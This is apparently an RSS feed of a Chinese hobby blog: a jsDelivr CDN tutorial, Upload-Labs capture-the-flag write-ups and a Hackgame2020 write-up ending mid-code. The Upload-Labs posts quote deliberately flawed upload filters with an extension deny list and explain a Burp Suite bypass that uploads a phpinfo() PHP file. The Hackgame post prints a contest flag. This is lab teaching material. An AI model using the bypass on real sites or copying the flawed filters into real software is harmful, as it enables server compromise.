&lt;p>&lt;strong>Warning&lt;/strong> 本特性已自 PHP 5.3.0 起&lt;em>废弃&lt;/em>并将自 PHP 5.4.0 起&lt;em>移除&lt;/em>。&lt;/p>
&lt;p>​ 为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &amp;rsquo; (单引号)、&amp;quot; (双引号)、\（反斜杠）和 NUL&amp;rsquo;s 被一个反斜杠自动转义。&lt;/p></description></item><item><title>jsDelivr加速静态博客</title><link>/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</link><pubDate>Wed, 11 Nov 2020 21:37:53 +0000</pubDate><guid>/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>​	这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。&lt;/p>
&lt;blockquote>
&lt;p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科&lt;/p>&lt;/blockquote>
&lt;p>在犹豫要不要买的时候，发现了这个东西：&lt;a href="https://www.jsdelivr.com/">jsdelivr&lt;/a>，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞&lt;/p>
&lt;h2 id="1-新建仓库">1. 新建仓库&lt;/h2>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed/artical/20201111202508.png" alt="">&lt;/p>
&lt;p>​	名字重了是因为我已经创建好了并且使用了以后才来写的博客。&lt;/p>
&lt;h2 id="2-克隆git仓库到本地">2. 克隆Git仓库到本地&lt;/h2>
&lt;p>​	在自己电脑建个文件夹然后打开git输入&lt;code>git clone 你仓库的链接&lt;/code>，把刚刚创建的仓库拉倒本地方便上传到仓库。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed/artical/20201111203733.png" alt="">&lt;/p>
&lt;p>廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：&lt;a href="https://www.liaoxuefeng.com/wiki/896043488029600/896067008724000">Git简介&lt;/a>。&lt;/p>
&lt;h2 id="3-上传需要加速的资源">3. 上传需要加速的资源&lt;/h2>
&lt;p>​	把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。&lt;/p>
&lt;pre tabindex="0">&lt;code>git status //查看状态
git add . //添加所有文件到暂存区
git commit -m &amp;#39;第一次提交&amp;#39; //把文件提交到仓库
git push //推送至远程仓库
&lt;/code>&lt;/pre>&lt;p>​	这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。&lt;/p>
&lt;p>​	接下来是要上传哪些文件，我使用的是&lt;code>butterfly&lt;/code>这个主题，&lt;a href="https://github.com/jerryc127/hexo-theme-butterfly">主题github&lt;/a>支持一下作者，直接在主题&lt;code>theme/butterfly&lt;/code>文件夹下面找到资源文件夹&lt;code>source&lt;/code>发现里面都是一些零碎的文件，但是在发布文件夹&lt;code>public&lt;/code>下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed/artical/20201111205045.png" alt="">	穷人流下了不争气的泪。传！(真加速还得选好服务器)&lt;/p>
&lt;p>​	这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。&lt;/p>
&lt;p>​	做法：配置文件里找到引用的是本地资源的项，然后在生成网站的&lt;code>public&lt;/code>文件下找到对应的资源文件。&lt;/p>
&lt;p>我列一下我在配置文件里修改的项：&lt;code>main_css&lt;/code>、&lt;code>main&lt;/code>、&lt;code>utils&lt;/code>、&lt;code>local_search&lt;/code>、&lt;code>algolia_js&lt;/code>、&lt;code>translate&lt;/code>，因为使用的是&lt;code>Valine&lt;/code>评论，里面可以设置自定义表情，我也使用这个方法修改了。&lt;/p>
&lt;h2 id="3-获取地址">3. 获取地址&lt;/h2>
&lt;p>​	官网首页很清楚的写明了如何获取资源链接&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201111211357.png" alt="">&lt;/p>
&lt;p>​	&lt;code>https://cdn.jsdelivr.net/gh/user/repo@version/file&lt;/code>，&lt;code>user&lt;/code>就是你的github用户名，&lt;code>repo@version&lt;/code>，仓库加上版本号，&lt;code>file&lt;/code>就是仓库下的路径。&lt;/p>
&lt;p>​	这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接&lt;code>reop@分支名&lt;/code>，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。&lt;/p>
&lt;p>​	贴一个我博客首页的壁纸链接：https://cdn.jsdelivr.net/gh/penginman/PicBed@master/top_img/83531406_p0.png&lt;/p>
&lt;p>​	这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。&lt;/p>
&lt;h2 id="4-引用链接">4. 引用链接&lt;/h2>
&lt;p>​	配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了&lt;strong>你现在引用的是之前的上传的静态资源&lt;/strong>，别忘啦！别忘啦！别忘啦！&lt;/p>
&lt;p>​	我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。&lt;/p>
&lt;p>​	还有我整理的&lt;code>Valine&lt;/code>评论的自定义表情，大伙可以直接拿去用：&lt;a href="https://cdn.jsdelivr.net/gh/penginman/CDN@master/emoji/">图片地址&lt;/a>，&lt;a href="https://cdn.jsdelivr.net/gh/penginman/CDN@master/emoji/valine.json">emojimap&lt;/a>。完工&lt;/p></description></item><item><title>Upload-Labs(二)</title><link>/posts/ctf/upload-labs2/</link><pubDate>Mon, 09 Nov 2020 20:12:27 +0000</pubDate><guid>/posts/ctf/upload-labs2/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>​	这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。&lt;/p>
&lt;pre tabindex="0">&lt;code>$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
 if (file_exists(UPLOAD_PATH)) {
 //这里下面是过滤
 $deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.html&amp;#34;, ......);
 $file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $file_name = deldot($file_name);//删除文件名末尾的点
 $file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
 $file_ext = strtolower($file_ext); //转换为小写
 $file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//去除字符串::$DATA
 $file_ext = trim($file_ext); //首尾去空

	//这里下面是移动文件。
 	if (!in_array($file_ext, $deny_ext)) {
 $temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
 $img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
 if (move_uploaded_file($temp_file, $img_path)) {
 $is_upload = true;
 } else {
 $msg = &amp;#39;上传出错！&amp;#39;;
 }
 } else {
 $msg = &amp;#39;此文件类型不允许上传！&amp;#39;;
 }
 
 } else {
 $msg = UPLOAD_PATH . &amp;#39;文件夹不存在,请手工创建！&amp;#39;;
 }
}
&lt;/code>&lt;/pre>&lt;p>过滤部分：&lt;/p></description></item><item><title>Upload-Labs(一)</title><link>/posts/ctf/upload-labs1/</link><pubDate>Sun, 08 Nov 2020 19:23:16 +0000</pubDate><guid>/posts/ctf/upload-labs1/</guid><description>&lt;h2 id="介绍">介绍&lt;/h2>
&lt;blockquote>
&lt;p>大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。&lt;/p>&lt;/blockquote>
&lt;p>在线靶机地址：&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://buuoj.cn/challenges#Upload-Labs-Linux">linux环境&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://buuoj.cn/challenges#%5BWindows%5DUpload-Labs-Windows">windows环境&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="pass-01">Pass-01&lt;/h2>
&lt;p>​	尝试上传php木马，发现提示上传错误&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTKbfs.png" alt="">&lt;/p>
&lt;p>​	提示只能上传&lt;code>jpg、png、gif&lt;/code>类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。&lt;/p>
&lt;p>​	源码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">checkFile&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">getElementsByName&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>].&lt;span style="color:#a6e22e">value&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;请选择要上传的文件!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//定义允许上传的文件类型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">allow_ext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;.jpg|.png|.gif&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//提取上传文件的类型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">ext_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file&lt;/span>.&lt;span style="color:#a6e22e">substring&lt;/span>(&lt;span style="color:#a6e22e">file&lt;/span>.&lt;span style="color:#a6e22e">lastIndexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//判断上传文件类型是否允许上传
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">allow_ext&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">ext_name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;|&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">errMsg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;该文件不允许上传，请上传&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">allow_ext&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;类型的文件,当前文件类型为：&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">ext_name&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#a6e22e">errMsg&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	把文件后缀名改成jpg格式上传，使用&lt;strong>burp suit&lt;/strong>抓包。把&lt;code>.jpg&lt;/code>后缀重新改为&lt;code>.php&lt;/code>即可实现绕过前端JS代码。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTM5g1.png" alt="">&lt;/p>
&lt;p>​	然后右键打开图片，代码成功执行。完工&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/08/BTQV8s.png" alt="">&lt;/p>
&lt;p>​	注：后面题目的php代码都使用&lt;code>2333.php&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#66d9ef">eval&lt;/span>(&lt;span style="color:#a6e22e">phpinfo&lt;/span>());
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	执行结果是打印出php版本信息。&lt;/p>
&lt;h2 id="pass-02">Pass-02&lt;/h2>
&lt;p>​	源码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">file_exists&lt;/span>(&lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/jpeg&amp;#39;&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> ($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/png&amp;#39;&lt;/span>) &lt;span style="color:#f92672">||&lt;/span> ($_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;image/gif&amp;#39;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>] 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file, $img_path)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;上传出错！&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;文件类型不正确，请重新上传！&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;文件夹不存在,请手工创建！&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	发现文件判断是根据&lt;code>image/jpeg、image/png...&lt;/code>进行过滤判定，这些值都是Http请求中的&lt;strong>Content-Type&lt;/strong>常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:&lt;a href="https://www.cnblogs.com/klb561/p/10090540.html">Http请求中Content-Type&lt;/a>。&lt;/p></description></item><item><title>Hackgame2020(二)</title><link>/posts/ctf/hackgame20202/</link><pubDate>Thu, 05 Nov 2020 09:29:22 +0000</pubDate><guid>/posts/ctf/hackgame20202/</guid><description>&lt;h3 id="一闪而过的flag">一闪而过的Flag&lt;/h3>
&lt;p>​	根据题目信息&lt;strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过&lt;/strong>，我想到了应该能看程序的代码啥的找到，但是&lt;del>天下武功，唯快不破&lt;/del>，下载 运行 截图一气呵成。&lt;/p>
&lt;p>​	&lt;img src="https://s1.ax1x.com/2020/11/09/B7TOUA.png" alt="">&lt;/p>
&lt;p>​	接下来让我康康哪一位是&lt;del>瞎子&lt;/del>，包括答案里也是满满的嘲讽。&lt;/p>
&lt;p>&lt;strong>参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}&lt;/strong>&lt;/p>
&lt;h3 id="从零开始的记账工具人">从零开始的记账工具人&lt;/h3>
&lt;p>​	&lt;del>npy&lt;/del>给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/05/B2Flxf.png" alt="">&lt;/p>
&lt;p>​	原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.util.Scanner;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Main&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Scanner sn &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Scanner(System.&lt;span style="color:#a6e22e">in&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String str;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> x;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> cnt&lt;span style="color:#f92672">=&lt;/span>0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> result&lt;span style="color:#f92672">=&lt;/span>0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(cnt&lt;span style="color:#f92672">++!=&lt;/span>1000){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> str &lt;span style="color:#f92672">=&lt;/span> sn.&lt;span style="color:#a6e22e">next&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> sn.&lt;span style="color:#a6e22e">nextInt&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">+=&lt;/span> tonum(str)&lt;span style="color:#f92672">*&lt;/span>x;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">double&lt;/span> &lt;span style="color:#a6e22e">tonum&lt;/span>(String s){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> res&lt;span style="color:#f92672">=&lt;/span>0,temp &lt;span style="color:#f92672">=&lt;/span> 1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> result&lt;span style="color:#f92672">=&lt;/span>0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> s.&lt;span style="color:#a6e22e">length&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> i&lt;span style="color:#f92672">=&lt;/span>0;i&lt;span style="color:#f92672">&amp;lt;&lt;/span>len;i&lt;span style="color:#f92672">++&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> (s.&lt;span style="color:#a6e22e">charAt&lt;/span>(i)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;壹&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>1;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;贰&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>2;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;叁&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>3;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;肆&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>4;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;伍&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>5;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;陆&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>6;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;柒&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>7;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;捌&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>8;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;玖&amp;#39;&lt;/span>: temp&lt;span style="color:#f92672">=&lt;/span>9;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;零&amp;#39;&lt;/span>: &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;拾&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>10;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
